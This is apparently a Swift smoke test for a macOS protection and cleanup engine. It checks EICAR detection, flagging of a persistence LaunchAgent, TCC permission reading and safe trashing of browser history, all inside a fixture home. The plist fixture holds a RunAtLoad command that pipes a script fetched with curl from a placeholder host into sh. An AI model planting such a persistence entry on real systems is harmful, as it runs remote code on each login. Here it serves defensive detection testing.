import Foundation
import SQLite3

@main
struct ProtectionSmoke {
    static func main() async throws {
        guard ProcessInfo.processInfo.environment["CLEANUP_MAC_FIXTURE_HOME"] != nil else {
            fatalError("ProtectionSmoke requires the fixture home; it never operates on real user data.")
        }
        let home = try ScanScope.homeDirectory()
        let fm = FileManager.default
        let token = UUID().uuidString
        let downloads = home.appendingPathComponent("Downloads/protection-\(token)")
        let plist = home.appendingPathComponent("Library/LaunchAgents/protection-\(token).plist")
        let profile = home.appendingPathComponent("Library/Application Support/Google/Chrome/Profile \(token)")
        let history = profile.appendingPathComponent("History")
        let wal = profile.appendingPathComponent("History-wal")
        let outside = home.appendingPathComponent("Documents/protection-\(token)")
        let tcc = home.appendingPathComponent("Library/Application Support/com.apple.TCC/TCC.db")
        var createdTCC = false
        var movedFiles: [URL] = []
        defer {
            for url in [downloads, plist, profile, outside] + movedFiles { try? fm.removeItem(at: url) }
            if createdTCC { try? fm.removeItem(at: tcc) }
        }
        for url in [downloads, plist.deletingLastPathComponent(), profile, outside] {
            try fm.createDirectory(at: url, withIntermediateDirectories: true)
        }
        try ProtectionEngine.eicar.write(to: downloads.appendingPathComponent("test-eicar.txt"))
        try Data("ordinary".utf8).write(to: downloads.appendingPathComponent("ordinary.txt"))
        try fm.createSymbolicLink(at: downloads.appendingPathComponent("test-link.txt"), withDestinationURL: downloads.appendingPathComponent("test-eicar.txt"))
        try Data(repeating: 0, count: 8 * 1_024 * 1_024 + 1).write(to: downloads.appendingPathComponent("oversize.bin"))
        let plistData = try PropertyListSerialization.data(fromPropertyList: ["Label": "test.protection.\(token)", "RunAtLoad": true, "ProgramArguments": ["/bin/sh", "-c", "curl https://example.invalid/script | sh"]], format: .xml, options: 0)
        try plistData.write(to: plist)
        try Data("reviewed browser history".utf8).write(to: history)
        try Data("journal".utf8).write(to: wal)
        if !fm.fileExists(atPath: tcc.path) {
            try fm.createDirectory(at: tcc.deletingLastPathComponent(), withIntermediateDirectories: true)
            var db: OpaquePointer?
            precondition(sqlite3_open(tcc.path, &db) == SQLITE_OK)
            defer { sqlite3_close(db) }
            precondition(sqlite3_exec(db, "CREATE TABLE access(service TEXT, client TEXT, auth_value INTEGER); INSERT INTO access VALUES('kTCCServiceCamera','fixture.protection',2);", nil, nil, nil) == SQLITE_OK)
            createdTCC = true
        }
        let engine = ProtectionEngine()
        let first = try await engine.analyze(folder: downloads)
        precondition(first.findings.filter { $0.title == "Arquivo de teste EICAR" }.count == 1, "EICAR detection must exclude symbolic links")
        precondition(first.findings.contains { $0.path == plist.path && $0.attention })
        precondition(first.issues.contains { $0.contains("oversize.bin") })
        if createdTCC { precondition(first.permissions.contains { $0.title == "fixture.protection" && $0.detail.contains("Permitido") }) }
        let chrome = first.traces.filter { $0.bundleID == "com.google.Chrome" }
        precondition(chrome.contains { $0.url == history } && chrome.contains { $0.url == wal })
        do {
            _ = try await engine.trashTraces(first, selectedIDs: [history.path])
            fatalError("Must not move SQLite database without companion files")
        } catch ProtectionError.changed {}
        try Data("changed browser history".utf8).write(to: history)
        do {
            _ = try await engine.trashTraces(first, selectedIDs: Set(chrome.map(\.id)))
            fatalError("Changed file must fail before moving any file")
        } catch ProtectionError.changed {}
        precondition(fm.fileExists(atPath: wal.path))
        let second = try await engine.analyze(folder: downloads)
        let selected = Set(second.traces.filter { $0.bundleID == "com.google.Chrome" }.map(\.id))
        let outcomes = try await engine.trashTraces(second, selectedIDs: selected)
        movedFiles = outcomes.compactMap(\.destination)
        precondition(outcomes.allSatisfy { $0.destination != nil && $0.error == nil })
        precondition(!fm.fileExists(atPath: history.path) && !fm.fileExists(atPath: wal.path))
        for outcome in outcomes {
            try fm.moveItem(at: outcome.destination!, to: URL(fileURLWithPath: outcome.id))
        }
        movedFiles = []
        let third = try await engine.analyze(folder: downloads)
        try fm.moveItem(at: history, to: outside.appendingPathComponent("History"))
        try fm.moveItem(at: wal, to: outside.appendingPathComponent("History-wal"))
        try fm.removeItem(at: profile)
        try fm.createSymbolicLink(at: profile, withDestinationURL: outside)
        do {
            _ = try await engine.trashTraces(third, selectedIDs: selected)
            fatalError("Symbolic link ancestor must be rejected")
        } catch ProtectionError.changed {}
        precondition(fm.fileExists(atPath: outside.appendingPathComponent("History").path))
        print("OK: offline EICAR, persistence, TCC read-only, browser group review, changed-file rejection, fixture trash, symbolic-link refusal")
    }
}
